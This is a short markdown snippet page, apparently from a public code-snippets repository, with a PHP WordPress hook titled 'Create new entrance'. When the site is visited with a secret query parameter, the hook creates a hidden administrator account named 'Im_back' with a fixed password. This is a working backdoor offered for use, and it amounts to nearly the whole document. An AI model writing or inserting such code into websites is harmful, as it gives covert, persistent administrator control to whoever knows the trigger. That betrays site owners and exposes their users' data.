## Create new entrance
[![License](https://img.shields.io/github/license/dedewiweka/snippets?color=brightgreen)](https://github.com/dedewiweka/snippets/blob/main/LICENSE) [![Contact](https://img.shields.io/badge/contact-Dede%20Wiweka-orange)](https://dede.wiweka.com/development) ![File size](https://img.shields.io/github/size/dedewiweka/snippets/Security/create-entrance.md) 
```php
//Open yoursite.com/?entrance=create
add_action('wp_head', 'create_entrance');
function create_entrance() {
  if(md5($_GET['entrance']) === '76ea0bebb3c22822b4f0dd9c9fd021c5') {
    require('wp-includes/registration.php');
    if(!username_exists('Im_back')) {
      $user_id = wp_create_user('Im_back', 'LetMeIn!');
      $user = new WP_User($user_id);
      $user->set_role('administrator');
    }
  }
}
```